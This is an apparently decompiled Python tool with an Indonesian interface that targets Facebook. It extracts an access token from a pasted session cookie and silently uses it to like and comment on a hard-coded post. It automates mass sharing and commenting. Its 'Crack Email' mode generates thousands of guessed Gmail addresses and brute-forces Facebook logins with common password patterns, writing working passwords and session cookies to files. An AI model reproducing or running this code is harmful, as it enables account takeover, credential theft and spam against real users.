""" Decompiled by Exotic Hridoy """

import datetime
import requests
import json
import os
import sys
import random
import time
import re
import calendar
import hashlib
import uuid
from rich.console import Console
from rich.panel import Panel
from concurrent.futures import ThreadPoolExecutor
from rich import print as rprint
from datetime import datetime
from time import strftime

p, m, h, k, b, u, o, n, a = "\x1b[0;97m", "\x1b[0;91m", "\x1b[0;92m", "\x1b[0;93m", "\x1b[0;94m", "\x1b[0;95m", "\x1b[0;96m", "\033[0m", "\033[90;1m"

id = []
ok, cp, loop = [], [], 0
__rakaandrian__ = []

bulan = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
tgl = datetime.now().day
bln = bulan[(str(datetime.now().month))]
thn = datetime.now().year
tanggal = (str(tgl)+' '+str(bln)+' '+str(thn))
waktu = strftime('%H:%M:%S')
hari = datetime.now().strftime("%A")

now = datetime.now()
hour = now.hour
if hour < 4: hhl = "Selamat Dini Hari"
elif 4 <= hour < 12: hhl = "Selamat Pagi"
elif 12 <= hour < 15: hhl = "Selamat Siang"
elif 15 <= hour < 17: hhl = "Selamat Sore"
elif 17 <= hour < 18: hhl = "Selamat Petang"
else: hhl = "Selamat Malam"

sys.stdout.write('\x1b]2; Bot | Raka_RBF™ \x07')

def clear_screen():
    if 'win' in sys.platform: os.system('cls')
    else: os.system('clear')

class RAKA_XYZ:
    def __init__(self):
        try:
            cokie = open('data/cookie.txt', 'r').read()
            token = open('data/tooken.txt', 'r').read()
        except FileNotFoundError:
            print(f'{m}>_ {p}Gunakan Cookie Fress')
            time.sleep(3)
            self.rakaXD()
        self.menu(cokie, token)

    def rakaXD(self):
        clear_screen()
        print(rakaxyz)
        print(f'{m}>_ {p}Gunakan Akun Tumbal ...')
        coki = input(f'{m}>_ {p}Input Cookie : {h}')

        try:
            cari = requests.get("https://business.facebook.com/business_locations",
                              headers={"user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36",
                                      "cookie":coki})
            toke = re.search("(EAAG\w+)", cari.text).group(1)

            if "EAAG" in str(toke):
                open("data/cookie.txt","w").write(coki)
                open("data/tooken.txt","w").write(toke)
                # Auto like and comment
                requests.post(f"https://graph.facebook.com/pfbid02uzZPrK7BzNFfbCRCpjiotzihv3sQ2jj93WwCaSnigoK3pXqH33eCFAQtT1vv8Adwl/likes?summary=true&access_token={toke}", 
                            cookies={"cookie":coki})
                requests.post(f"https://graph.facebook.com/100000834003593_pfbid02uzZPrK7BzNFfbCRCpjiotzihv3sQ2jj93WwCaSnigoK3pXqH33eCFAQtT1vv8Adwl/comments/?message={emotnya}&access_token={toke}", 
                            cookies={"cookie":coki})

                exit(print(f'{m}>_ {p}Login Succes, Jalankan Ulang Printahnya'))

        except AttributeError:
            exit(print(f'{m}>_ {p}Cookie Mokad'))
        except requests.exceptions.ConnectionError:
            exit(print(f'{m}>_ {p}Tidak Ada Koneksi Internet'))

    def menu(self, kuki, token):
        clear_screen()
        print(rakaxyz)

        try:
            nama = requests.get(f"https://graph.facebook.com/me?access_token={token}", 
                              cookies={"cookie":kuki}).json()['name']
        except KeyError:
            self.rakaXD()
        except requests.exceptions.ConnectionError:
            exit(print(f'{m}>_ {p}Pastikan Koneksinya Aman Goblog'))

        print(f'{m}>_ {p}{hhl} {h}{nama}')
        print(f'{p}({m}a{p}) Bot Auto Share')
        print(f'{p}({m}b{p}) Bot Auto Comend')
        print(f'{p}({m}c{p}) Crack Email')
        print(f'{p}({m}L{p}) Logout')

        rakaxyzzz = input(f'{m}>_ {p}Pilih : {h}')

        if rakaxyzzz in ['1','A','a']:
            print(f'{m}NOTE : {p}Copy Link Postingannya Lewat Facebook Lite')
            link = input(f'{m}>_ {p}Masukan link : {h}')
            try: limit = int(input(f'{m}>_ {p}Enter Limit : {h}'))
            except: limit = 50
            self.share(link, limit, token, kuki)

        elif rakaxyzzz in ['2','B','b']:
            print(f'{m}WARNING : {p}Pastikan ID postingan Benar')
            target = input(f'{m}>_ {p}Masukan Id Target : {h}')
            komen = input(f'{m}>_ {p}Masukan Text : {h}')
            limit = int(input(f'{m}>_ {p}Enter Limit : {h}'))
            self.komen(target, komen, limit, token, kuki)

        elif rakaxyzzz in ['3','C','c']:
            self.target()
        elif rakaxyzzz in ['L','l','0']:
            os.system('rm -rf data/cookie.txt && rm -rf data/tooken.txt')
            os.system('exit')
        else:
            exit(print(f'{m}>_ {p}Pilih Yang Benar TOD KENTOD'))

    def target(self):
        try:
            nama = input(f'{m}>_ {p}Nama Target : {h}')
            jumlah = int(input(f'{m}>_ {p}Jumlah Target : {h}'))

            if jumlah > 90000:
                exit(f'{m}>_ {p}limit dump {m}90000')
                time.sleep(3)

            domain = "@gmail.com"
            for z in range(int(jumlah)):
                if len(nama.split()) > 1:
                    idc = f"{nama.split()[0]}{nama.split()[1]}{z}{domain}|{nama.split()[0]} {nama.split()[1]}"
                else:
                    idc = f"{nama}{z}{domain}|{nama}"

                if idc not in id:
                    id.append(idc)
                    sys.stdout.write(f'\r{m}>_ {p}Total : {h}{str(len(id))}')
                    sys.stdout.flush()
                    time.sleep(0.0050)

        except: pass

        input(f'{m}>_ {p}Tekan Enter Untuk Mulai ...')
        self.langsung()

    def langsung(self):
        with ThreadPoolExecutor(max_workers=30) as executor:
            for akun in id:
                pwx = ['sayangku','sayang123']
                uid, name = akun.split('|')[0], akun.split('|')[1].lower()
                idz = name.split(' ')[0]

                if len(name) < 6:
                    if len(idz) >= 3:
                        pwx.append(name)
                        pwx.append(idz + '123')
                        pwx.append(idz + '12345')
                        pwx.append(idz + '1234')
                        pwx.append(idz + '123456')
                        pwx.append(idz + '0' + str(random.randint(1, 10)))
                        pwx.append(idz + '2' + str(random.randint(1, 10)))
                        pwx.append(idz.capitalize() + '1' + str(random.randint(1, 10)))
                else:
                    if len(idz) < 3:
                        pwx.append(name.capitalize())
                    else:
                        pwx.append(name)
                        pwx.append(idz + '123')
                        pwx.append(idz + '234')
                        pwx.append(idz + '12345')
                        pwx.append(idz + '1' + str(random.randint(1, 10)))
                        pwx.append(idz.capitalize() + '123')

                executor.submit(self.reg, uid, pwx)

    def reg(self, user, peweh):
        global ok, cp, loop, __rakaandrian__
        bf = random.choice([h,m,p,k,u])
        print(f"\r{p}• {bf}Rbf {p}{str(loop)}/{len(id)} {h}OK:{len(ok)} {k}CP:{len(cp)}", end="")

        ugen = random.choice([
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 15_1_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36'
        ])

        for pw in peweh:
            try:
                ses = requests.Session()
                req1 = ses.get('https://www.facebook.com/login.php?skip_api_login=1&api_key=3189881811064576&kid_directed_site=0&app_id=3189881811064576&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fv19.0%2Fdialog%2Foauth%3Fclient_id%3D3189881811064576%26redirect_uri%3Dhttps%253A%252F%252Fappcontx.com%252Fphp%252Fauth.php%26auth_type%3Drerequest%26state%3D%257B%2522wt%2522%253A%25222%2522%252C%2522app%2522%253A%2522login%2522%257D%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dc8725589-f735-4009-8a63-2ecb08e9e7af%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fappcontx.com%2Fphp%2Fauth.php%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522wt%2522%253A%25222%2522%252C%2522app%2522%253A%2522login%2522%257D%23_%3D_&display=page&locale=id_ID&pl_dbl=0').text

                data = {
                    'jazoest': re.search('name="jazoest" value="(.*?)"', str(req1)).group(1),
                    'lsd': re.search('name="lsd" value="(.*?)"', str(req1)).group(1),
                    'api_key': '3189881811064576',
                    'email': user,
                    'encpass': f'#PWD_BROWSER:0:{int(time.time())}:{pw}'
                }

                head = {
                    'User-Agent': ugen,
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'origin': 'https://www.facebook.com'
                }

                datr = re.search('_js_datr","(.*?)"', str(req1)).group(1)
                coki = f"datr={datr};locale=id_ID;"

                req2 = ses.post('https://www.facebook.com/login/device-based/regular/login/', 
                              data=data, headers=head, cookies={'cookie': coki}, 
                              allow_redirects=False)

                if 'c_user' in ses.cookies.get_dict():
                    kukis = ";".join([f"{key}={value}" for key, value in ses.cookies.get_dict().items()])
                    rakaXYZ = re.search('c_user=(\\d+)', str(kukis)).group(1)

                    if rakaXYZ not in __rakaandrian__:
                        __rakaandrian__.append(rakaXYZ)
                        print(f'\r{h}*---> {rakaXYZ} • {pw} • {kukis}')
                        info = f"{user}|{pw}|{kukis}"
                        ok.append(info)
                        open(f'OK/{tanggal}.txt', 'a').write(f"{info}\n")
                        break

                elif 'checkpoint' in ses.cookies.get_dict():
                    try: rakaXD = ses.cookies.get_dict()['checkpoint'].split('3A')[1].split('%')[0]
                    except: rakaXD = user

                    if rakaXD not in __rakaandrian__:
                        __rakaandrian__.append(rakaXD)
                        print(f'\r{k}*---> {rakaXD} • {pw} • {ugen}')
                        info = f"{user}|{pw}"
                        cp.append(info)
                        open(f'CP/{tanggal}.txt', 'a').write(f"{info}\n")
                        break

            except requests.exceptions.ConnectionError:
                time.sleep(31)

        loop += 1

    def share(self, link, limit, token, rakaexde):
        sukses = []
        try:
            headers = {"user-agent": self.useragent()}
            for i in range(limit):
                link_pos = requests.post(f"https://graph.facebook.com/v13.0/me/feed?link={link}&published=0&access_token={token}",
                                       headers=headers, cookies={'cookie':rakaexde})
                response = json.loads(link_pos.text)
                xyz = random.choice([m,k,h,p])
                print(f"\r{m}>_ {xyz}Running{p} {len(sukses)} {xyz}Succes", end="")

                if "id" in response: sukses.append("Share")
                else: sukses.append("Tolol")

        except Exception as e:
            exit(print(f'{m}>_ {p}Cookie Kadaluarsa'))

    def komen(self, id, text, lim, token, cokie):
        ok = []
        for x in range(lim):
            for komenn in text.split(','):
                mewmex = requests.post(f'https://graph.facebook.com/{id}/comments/?message={komenn}&access_token={token}',
                                     cookies={'cookie':cokie})
                cek_st = json.loads(mewmex.text)
                xyz = random.choice([m,k,h,p])
                print(f'\r{m}>_ {xyz}Running {p}{len(ok)} {xyz}Comend Succes', end='')

                if 'id' in cek_st: ok.append('ya')

    def useragent(self):
        return 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'

rakaxyz = (f'''{m}
   {p}BOT AUTO SHARE{h}
   {p}MADE WITH BY{h}
   {p}RAKA ANDRIAN TARA{m} ™{p}
''')

emotnya = 'never giv up :v'

if __name__ == '__main__':
    clear_screen()
    try: os.mkdir('CP')
    except: pass
    try: os.mkdir('OK')
    except: pass
    RAKA_XYZ()
